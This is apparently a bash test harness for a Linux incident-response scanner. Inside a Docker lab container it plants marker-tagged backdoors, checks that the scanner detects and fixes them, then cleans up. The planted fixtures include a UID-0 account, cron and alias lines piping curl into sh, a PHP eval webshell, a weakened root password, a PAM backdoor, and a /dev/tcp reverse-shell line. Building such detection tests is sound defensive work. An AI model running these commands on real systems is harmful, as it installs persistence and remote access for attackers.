#!/usr/bin/env bash
# centos-ir-lab 测试台（v0.4）：远程脚本以文件方式 docker cp 进容器执行——零引号地狱。
# 夹具全部 ctfir-marker 前缀；结束清理并复验。用法: fixture_builder_centos.sh <linux_ctfir_path>
set -uo pipefail
export MSYS_NO_PATHCONV=1
BIN_HOST="$1"
C=centos-ir-lab
pass=0; fail=0
ok()  { pass=$((pass+1)); echo "[PASS] $1"; }
bad() { fail=$((fail+1)); echo "[FAIL] $1"; }

# ---- 远程脚本（本地生成，docker cp 进容器）----
mkdir -p /d/ctfir-build/fixtmp

# 阶段2：夹具安装
cat > /d/ctfir-build/fixtmp/install.sh <<'FIXEOF'
#!/bin/bash
sed -i "/ctfir-marker/d;/ctfir-mark-empty/d" /etc/passwd
echo "ctfir-marker:x:0:0:marker:/tmp:/bin/sh" >> /etc/passwd
mkdir -p /home/ctfir-mark-home
echo "ctfir-mark-empty::19001:19001::/home/ctfir-mark-home:/bin/sh" >> /etc/passwd
echo "ctfir-mark-sys:x:498:498::/var/empty:/bin/bash" >> /etc/passwd
echo "* * * * * root curl http://127.0.0.1/ctfir-marker | sh" > /etc/cron.d/ctfir-marker
echo "127.0.0.1 ctfir-marker.invalid # ctfir-marker" >> /etc/hosts
echo 'alias ls="curl http://127.0.0.1/ctfir-marker | sh"' > /etc/profile.d/ctfir-marker.sh
mkdir -p /var/www/html /var/log/httpd /etc/systemd/system /root/.ssh /usr/bin /etc/redis /var/spool/at
printf '<?php eval($_POST["cmd"]); ?>\n' > /var/www/html/ctfir-marker.php
printf '<?php phpinfo(); ?>\n' > /var/www/html/ctfir-marker-phpinfo.php
i=0; while [ $i -lt 60 ]; do echo '10.99.99.99 - - [08/Nov/2026:10:00:00 +0800] "POST /ctfir-marker.php HTTP/1.1" 200 -' >> /var/log/httpd/access_log; i=$((i+1)); done
printf '[Timer]\nOnCalendar=*\n' > /etc/systemd/system/ctfir-marker.timer
echo "curl http://127.0.0.1/ctfir-marker | sh" > /var/spool/at/ctfir-marker
chmod o+r /etc/shadow
cp /bin/true /usr/bin/ctfir-marker-cap && setcap cap_net_raw+ep /usr/bin/ctfir-marker-cap 2>/dev/null
ORIG=$(grep '^root:' /etc/shadow | cut -d: -f2)
echo "$ORIG" > /tmp/ctfir-root-hash.bak
NEW=$(openssl passwd -1 -salt ctfirmk 123456 2>/dev/null)
if [ -n "$NEW" ]; then sed -i "s|^root:[^:]*:|root:$NEW:|" /etc/shadow; echo patched > /tmp/ctfir-root-patched; fi
ln -sf /dev/null /etc/systemd/system/multi-user.target.wants/ctfir-marker-telnet.service 2>/dev/null
printf 'bind 0.0.0.0\nprotected-mode no\n' > /etc/redis/redis.conf
printf '[mysqld]\nlocal-infile=1\n' > /etc/my.cnf
echo "allow_url_include=On" > /tmp/ctfir-php.ini
# --- R10: 命令替换 / SSH端口 / 最近文件 / 进程名伪装 ---
cp -f /usr/bin/ls /usr/bin/ls.ctfir-bak 2>/dev/null
printf '#!/bin/sh\necho ctfir-marker\n' > /usr/bin/ls && chmod 755 /usr/bin/ls
mkdir -p /etc/ssh
grep -q '^Port ' /etc/ssh/sshd_config 2>/dev/null || echo "Port 2222" >> /etc/ssh/sshd_config 2>/dev/null || printf 'Port 2222\n' > /etc/ssh/sshd_config
printf '#!/bin/sh\n' > /root/ctfir-marker-recent.sh && chmod 755 /root/ctfir-marker-recent.sh
cp -f /bin/sleep /tmp/ctfir-mismatch
bash -c 'exec -a kworkerd /tmp/ctfir-mismatch 600' >/dev/null 2>&1 &
# --- R12: 数据库日志取证 / 敏感凭据泄露 / 中间件降权 ---
mkdir -p /var/lib/mysql
printf '2026-11-12T10:00:01\t 1 Query\tSELECT * FROM users\n2026-11-12T10:00:05\t 1 Query\tSELECT \"<?php eval($_POST[1]);?>\" INTO OUTFILE \"/var/www/html/ctfir-marker-logshell.php\"\n' > /var/lib/mysql/ctfir-general.log
printf 'APP_KEY=ctfir-marker-secret\nDB_PASSWORD=ctfir-marker-pass\n' > /var/www/html/.env
mkdir -p /var/www/html/.git/objects
echo "[core]" > /var/www/html/.git/config
# root 身份拉起一个伪装名 mysqld 的 sleep（降权检查正例；mysqld 以 root 运行必报。
# 不用 httpd 伪装——Apache master-root 是标准架构，worker 降权即不报）
cp -f /bin/sleep /tmp/ctfir-rootmw
bash -c 'exec -a mysqld /tmp/ctfir-rootmw 600' >/dev/null 2>&1 &
# --- R13: PAM后门 / umask / 失败锁定 / 勒索痕迹 / sshd口令登录 ---
mkdir -p /etc/pam.d
echo "auth required pam_exec.so /tmp/ctfir-marker-pam.sh" > /etc/pam.d/ctfir-marker-pam
echo "umask 022" > /etc/profile.d/ctfir-marker-umask.sh
printf 'YOUR FILES HAVE BEEN ENCRYPTED\nSend 0.5 BTC\n' > /root/README_DECRYPT_FILES.html
printf 'secret\n' > /root/victim.docx.locked
grep -q "^Port " /etc/ssh/sshd_config 2>/dev/null || true
grep -q "^PasswordAuthentication" /etc/ssh/sshd_config 2>/dev/null || echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config 2>/dev/null
# --- R14: UDF提权 / error.log反弹shell / 黑链 / 攻击工具 / 点开头隐藏公钥 ---
mkdir -p /usr/lib/mysql/plugin
printf 'UDF payload' > /usr/lib/mysql/plugin/udf.so
printf '220101 10:00:00 mysqld_safe sh -c "bash -i >&/dev/tcp/10.11.55.21/3333 0>&1"\n' > /var/log/mysqld.log
printf '<div style="display:none"><a href="http://evil-blink.example.com/bet">bet</a></div>\n' > /var/www/html/index.php
mkdir -p /opt
printf 'fscan binary' > /opt/fscan_amd64
printf '[common]\nserver_addr = 10.11.55.21\nserver_port = 7000\n' > /tmp/frpc.ini
mkdir -p /root/.ssh
printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKEFAKEFAKE ctfir-marker@kali\n' > /root/.ssh/.id_rsa.pub
# --- v0.6-R16: SSHLOG / 宝塔 wwwlogs / GET 攻击特征 / slow+binlog ---
printf 'ctfir-marker : (redacted)\n' > /tmp/.sshlog
mkdir -p /www/wwwlogs /var/log/mysql
i=0; while [ $i -lt 60 ]; do echo '10.88.88.88 - - [12/Nov/2026:10:00:00 +0800] "POST /ctfir-marker-bt.php HTTP/1.1" 200 -' >> /www/wwwlogs/ctfir-marker.com.log; i=$((i+1)); done
echo '10.88.88.88 - - [12/Nov/2026:10:01:00 +0800] "GET /index.php?id=1%20UNION%20SELECT%201,2,3 HTTP/1.1" 200 12 "-" "sqlmap/1.7"' >> /www/wwwlogs/ctfir-marker.com.log
echo '10.77.77.77 - - [12/Nov/2026:10:02:00 +0800] "GET /static/../../etc/passwd HTTP/1.1" 200 - "-" "Mozilla/5.0"' >> /www/wwwlogs/ctfir-marker.com.log
printf '# Time: 2026-11-12T10:00:00\nSELECT "<?php eval($_POST[1]);?>" INTO OUTFILE "/var/www/html/ctfir-marker-slow.php";\n' > /var/log/mysql/mysql-slow.log
printf 'Query\tCREATE FUNCTION sys_eval RETURNS STRING SONAME "udf.so"\n' > /var/lib/mysql/mysql-bin.000001
echo INSTALL_DONE
FIXEOF

# 阶段4：清理
cat > /d/ctfir-build/fixtmp/cleanup.sh <<'CLNEOF'
#!/bin/bash
sed -i '/ctfir-marker/d;/ctfir-mark-empty/d;/ctfir-mark-sys/d' /etc/passwd 2>/dev/null || true
grep -v -e ctfir-marker -e ctfir-mark-empty -e ctfir-mark-sys /etc/hosts > /tmp/hosts.new 2>/dev/null && cat /tmp/hosts.new > /etc/hosts; rm -f /tmp/hosts.new
sed -i '/ctfir-marker/d' /var/log/httpd/access_log 2>/dev/null || true
if [ -f /tmp/ctfir-root-hash.bak ]; then
  ORIG=$(cat /tmp/ctfir-root-hash.bak)
  sed -i "s|^root:[^:]*:|root:$ORIG:|" /etc/shadow
  rm -f /tmp/ctfir-root-hash.bak /tmp/ctfir-root-patched
fi
rm -f /etc/cron.d/ctfir-marker /etc/profile.d/ctfir-marker.sh /etc/systemd/system/ctfir-marker.timer \
      /var/spool/at/ctfir-marker /var/www/html/ctfir-marker.php /var/www/html/ctfir-marker-phpinfo.php \
      /usr/bin/ctfir-marker-cap /etc/redis/redis.conf /etc/my.cnf /tmp/ctfir-php.ini \
      /root/ctfir-marker-recent.sh /tmp/ctfir-mismatch /tmp/ctfir-rootmw \
      /var/www/html/.env /var/lib/mysql/ctfir-general.log
rm -rf /var/www/html/.git
rm -f /etc/pam.d/ctfir-marker-pam /etc/profile.d/ctfir-marker-umask.sh \
      /root/README_DECRYPT_FILES.html /root/victim.docx.locked
sed -i '/^PasswordAuthentication yes$/d' /etc/ssh/sshd_config 2>/dev/null || true
rm -f /usr/lib/mysql/plugin/udf.so /var/log/mysqld.log /opt/fscan_amd64 /tmp/frpc.ini /root/.ssh/.id_rsa.pub
rm -f /var/www/html/index.php
rm -f /tmp/.sshlog /www/wwwlogs/ctfir-marker.com.log /var/log/mysql/mysql-slow.log /var/lib/mysql/mysql-bin.000001
rmdir /www/wwwlogs /www 2>/dev/null || true
[ -f /usr/bin/ls.ctfir-bak ] && mv -f /usr/bin/ls.ctfir-bak /usr/bin/ls
# argv[0] 伪装使 pgrep -f 失效，改用 exe 符号链接定位（检测同款思路）
for pd in /proc/[0-9]*; do
  [ "$(readlink "$pd/exe" 2>/dev/null | cut -d' ' -f1)" = "/tmp/ctfir-mismatch" ] && kill -9 "${pd##*/}" 2>/dev/null
done
sed -i '/^Port 2222$/d' /etc/ssh/sshd_config 2>/dev/null || true
# 若 sshd_config 是夹具新建的且只剩空壳则删除
[ -f /etc/ssh/sshd_config ] && [ ! -s /etc/ssh/sshd_config ] && rm -f /etc/ssh/sshd_config
rmdir /etc/redis 2>/dev/null
rm -f /etc/systemd/system/multi-user.target.wants/ctfir-marker-telnet.service
chmod og-rwx /etc/shadow 2>/dev/null
echo CLEANUP_DONE
CLNEOF

docker start "$C" >/dev/null 2>&1
ex() { docker exec "$C" bash -c "$1" 2>&1; }
ex 'pgrep -x crond >/dev/null || crond; pgrep -x rsyslogd >/dev/null || rsyslogd; pgrep -x sshd >/dev/null || /usr/sbin/sshd; pgrep -x httpd >/dev/null || httpd -k start' >/dev/null
docker cp "$BIN_HOST" "$C:/tmp/ctfir" >/dev/null
docker cp "D:/ctfir-build/fixtmp/install.sh" "$C:/tmp/install.sh" >/dev/null
docker cp "D:/ctfir-build/fixtmp/cleanup.sh" "$C:/tmp/cleanup.sh" >/dev/null
ex 'chmod +x /tmp/ctfir /tmp/install.sh /tmp/cleanup.sh' >/dev/null

echo "=== 阶段1：负例（centos-ir-lab 原生状态）==="
ex 'rm -rf /tmp/ctfir-out-neg && /tmp/ctfir scan --out /tmp/ctfir-out-neg >/dev/null 2>&1; echo exit=$?'
RESN=$(ex 'cat /tmp/ctfir-out-neg/findings.json')
RESNF=/d/ctfir-build/resn-live.json
printf '%s' "$RESN" > "$RESNF"
grep -q "ctfir-marker" "$RESNF" && bad "干净环境出现 marker" || ok "干净环境无 marker"
ex 'cat /tmp/ctfir-out-neg/findings.json' | grep -o '"rule_id": "[A-Z0-9.]*"' | sort | uniq -c > /d/ctfir-build/centos-native-findings.txt
echo "（原生发现清单已存 /d/ctfir-build/centos-native-findings.txt）"

echo "=== 阶段2：夹具安装 ==="
ex '/tmp/install.sh' | tail -1

echo "=== 阶段3：扫描断言（root + --baseline + --dir）==="
ex 'mkdir -p /tmp/ctfir-baseline; echo original-one > /tmp/ctfir-baseline/a.txt; echo original-two > /tmp/ctfir-baseline/b.txt; sha256sum /tmp/ctfir-baseline/a.txt /tmp/ctfir-baseline/b.txt | sed "s|/tmp/ctfir-baseline/||" > /tmp/ctfir-baseline.list; echo modified-one > /tmp/ctfir-baseline/a.txt'
ex 'rm -rf /tmp/ctfir-out-pos && /tmp/ctfir scan --out /tmp/ctfir-out-pos --baseline /tmp/ctfir-baseline.list --dir /tmp/ctfir-baseline >/dev/null 2>&1; echo exit=$?'
RES=$(ex 'cat /tmp/ctfir-out-pos/findings.json')

ex 'wc -c /tmp/ctfir-out-pos/findings.json; head -c 300 /tmp/ctfir-out-pos/findings.json; echo; ls -la /tmp/ctfir-out-pos/ | head -5' | head -10
EV=$(ex 'cat /tmp/ctfir-out-pos/evidence.json')
echo "$EV" > /d/ctfir-build/ev-dump.json
echo "EV_LEN=${#EV}"

RESF=/d/ctfir-build/res-live.json
printf '%s' "$RES" > "$RESF"   # 落盘断言（pipefail+echo 大串会 SIGPIPE 误判）
a() { grep -q "$1" "$RESF" && ok "$2" || bad "$3"; }
a "LNX.ACC.UID0.001"            "UID0 命中"              "UID0 漏检"
a "LNX.PERSIST.CRON.001"        "cron 命中"              "cron 漏检"
a "LNX.HOSTS.LOOPBACK.001"      "hosts 回环命中"         "hosts 回环漏检"
a "LNX.PERSIST.PROFILE.001"     "profile 命中"           "profile 漏检"
a "LNX.WEB.SHELL.001"           "webshell 命中"          "webshell 漏检"
a "LNX.WEB.LOGPOST.001"         "POST Top IP 命中"       "日志漏检"
grep -q "10.99.99.99" /d/ctfir-build/ev-dump.json && ok "Top IP 正确（evidence）" || bad "Top IP 错误"
a "LNX.TIMER.FACT.001"          "timer 事实化"           "timer 漏检"
a "LNX.PERSIST.AT.001"          "at 命中"                "at 漏检"
a "LNX.ACC.SHADOWPERM.001"      "shadow 权限命中"        "shadow 漏检"
a "LNX.CAPS.UNEXPECTED.001"     "caps 命中"              "caps 漏检"
a "LNX.FILES.BASELINE.001"      "基线 mismatch 命中"     "基线漏检"
echo "--- v0.4 基线/中间件 ---"
a "LNX.BASE.EMPTYPWD.001"       "空口令账户命中"         "空口令漏检"
a "LNX.BASE.WEAKPWD.001"        "root 弱口令命中"        "弱口令漏检"
a "LNX.BASE.SYSACCT.001"        "系统账户可登录命中"     "系统账户漏检"
a "LNX.BASE.UNSAFESVC.001"      "不安全服务命中"         "不安全服务漏检"
a "MID.REDIS.NOPASS.001"        "Redis 未授权命中"       "Redis 漏检"
a "MID.REDIS.PROTMODE.001"      "Redis protected-mode 命中" "Redis PM 漏检"
a "MID.MYSQL.LOCALINFILE.001"   "MySQL local-infile 命中" "MySQL 漏检"
a "MID.PHP.PHPINFO.001"         "phpinfo 文件命中"       "phpinfo 漏检"
echo "--- v0.5-R10 命令替换/端口/近期文件/进程伪装 ---"
a "LNX.BASE.CMDSIZE.001"        "ls 替换命中（大小异常）" "命令替换漏检"
a "LNX.SSH.PORT.001"            "SSH 2222 端口命中"      "SSH 端口漏检"
a "LNX.BASE.RECENT.001"         "近期可执行文件命中"     "近期文件漏检"
a "LNX.PROC.NAMEMISMATCH.001"   "进程名伪装命中"         "进程名伪装漏检"
echo "--- v0.5-R12 数据库日志取证/敏感凭据/降权 ---"
a "MID.MYSQL.LOGSHELL.001"      "日志写马命中"           "MySQL 日志取证漏检"
a "MID.WEB.CREDS.001"           ".env 凭据命中"          ".env 漏检"
a "MID.WEB.GITLEAK.001"         ".git 泄露命中"          ".git 漏检"
a "LNX.BASE.DROPRIGHT.001"      "root 中间件命中"        "降权漏检"
echo "--- v0.5-R13 PAM后门/umask/失败锁定/勒索/sshd口令 ---"
a "LNX.PERSIST.PAM.001"         "PAM 后门命中"           "PAM 后门漏检"
a "LNX.BASE.UMASK.001"          "umask 过宽命中"         "umask 漏检"
a "LNX.BASE.FAILLOCK.001"       "失败锁定缺失命中"       "faillock 漏检"
a "LNX.RANSOM.TRACE.001"        "勒索痕迹命中"           "勒索漏检"
a "LNX.SSH.PWDAUTH.001"         "sshd 口令登录命中"      "sshd PWDAUTH 漏检"
a "LNX.BASE.TMOUT.001"          "TMOUT 缺失命中"         "TMOUT 漏检"
echo "--- v0.5-R14 UDF/errlog/黑链/工具/点key ---"
a "MID.MYSQL.UDF.001"           "UDF 提权命中"           "UDF 漏检"
a "MID.MYSQL.ERRSHELL.001"      "error.log 反弹shell命中" "errlog 漏检"
a "LNX.WEB.BLACKLINK.001"       "黑链命中"               "黑链漏检"
a "LNX.TOOLS.ARTIFACT.001"      "fscan 工具命中"         "工具文件漏检"
a "LNX.TOOLS.FRPCFG.001"        "frpc 配置命中"          "frpc 漏检"
a "LNX.SSH.HIDDENKEY.001"       "点开头公钥命中"         "隐藏 key 漏检"
echo "--- v0.6 SSHLOG/宝塔日志/GET攻击/slow+binlog ---"
a "LNX.PERSIST.SSHLOG.001"      "SSHLOG 命中"            "SSHLOG 漏检"
a "LNX.WEB.LOGATTACK.001"       "GET 攻击特征命中"       "LOGATTACK 漏检"
a "MID.MYSQL.SLOWLOG.001"       "slow log 写马命中"      "slow log 漏检"
a "MID.MYSQL.BINLOG.001"        "binlog UDF 命中"        "binlog 漏检"
grep -q "ADVICE" "$RESF" && ok "建议挂接" || bad "建议缺失"

echo "=== 阶段3.5：fix 一键修复闭环（识别→修复→环境恢复逐项检查）==="
ex '/tmp/ctfir fix --session /tmp/ctfir-out-pos --all --yes' | grep -E "修复完成|失败 [1-9]" | tail -2
fchk() { ex "$2" >/d/ctfir-build/fchk.out 2>&1; grep -q "$3" /d/ctfir-build/fchk.out && ok "$1" || bad "$1（环境未恢复）"; }
fchk "UID0 账户已删"       'grep -c ctfir-marker /etc/passwd || true'      "^0$"
fchk "cron 行已注释"       'grep -c "ctfir-marker" /etc/cron.d/ctfir-marker || true' "^1$"
fchk "webshell 已隔离"     'test -f /var/www/html/ctfir-marker.php && echo STILL || echo GONE' "GONE"
fchk "phpinfo 已隔离"      'test -f /var/www/html/ctfir-marker-phpinfo.php && echo STILL || echo GONE' "GONE"
fchk "timer 已隔离"        'test -f /etc/systemd/system/ctfir-marker.timer && echo STILL || echo GONE' "GONE"
fchk "hosts 行已注释"      'grep -c "ctfir-marker" /etc/hosts || true'     "^1$"
fchk "SSH 2222 行已注释"   'grep -c "^Port 2222" /etc/ssh/sshd_config || true' "^0$"
fchk "PAM 后门行已注释"    'grep -c "^auth required pam_exec" /etc/pam.d/ctfir-marker-pam || true' "^0$"
fchk "udf.so 已隔离"       'test -f /usr/lib/mysql/plugin/udf.so && echo STILL || echo GONE' "GONE"
fchk "fscan 已隔离"        'test -f /opt/fscan_amd64 && echo STILL || echo GONE' "GONE"
fchk "frpc.ini 已隔离"     'test -f /tmp/frpc.ini && echo STILL || echo GONE' "GONE"
fchk "勒索信已隔离"        'test -f /root/README_DECRYPT_FILES.html && echo STILL || echo GONE' "GONE"
fchk ".env 已隔离"         'test -f /var/www/html/.env && echo STILL || echo GONE' "GONE"
fchk ".git 已隔离"         'test -d /var/www/html/.git && echo STILL || echo GONE' "GONE"
fchk "点key 已隔离"        'test -f /root/.ssh/.id_rsa.pub && echo STILL || echo GONE' "GONE"
fchk "伪装进程已杀"        'n=0; for pd in /proc/[0-9]*; do rl=$(readlink "$pd/exe" 2>/dev/null); case "$rl" in *ctfir-mismatch*|*ctfir-rootmw*) n=$((n+1));; esac; done; echo $n' "^0$"
fchk "install/cleanup 幸存" 'test -f /tmp/install.sh -a -f /tmp/cleanup.sh && echo BOTH || echo LOST' "BOTH"
fchk "root 未被删除"       'grep -c "^root:" /etc/passwd || true'          "^1$"

echo "=== 阶段4：清理并复验 ==="
ex '/tmp/cleanup.sh' | tail -1
ex 'rm -rf /tmp/ctfir-out-clean /tmp/ctfir-baseline /tmp/ctfir-baseline.list && /tmp/ctfir scan --out /tmp/ctfir-out-clean >/dev/null 2>&1'
RES2=$(ex 'cat /tmp/ctfir-out-clean/findings.json')
RES2F=/d/ctfir-build/res2-live.json
printf '%s' "$RES2" > "$RES2F"
grep -q "ctfir-marker" "$RES2F" && bad "清理后残留" || ok "清理复验通过"
ex 'rm -rf /tmp/ctfir-out-clean /tmp/ctfir-out-neg /tmp/ctfir-out-pos; rm -f /tmp/ctfir /tmp/install.sh /tmp/cleanup.sh' >/dev/null
docker stop "$C" >/dev/null 2>&1

echo "=== 结果: pass=$pass fail=$fail ==="
[ "$fail" -eq 0 ]
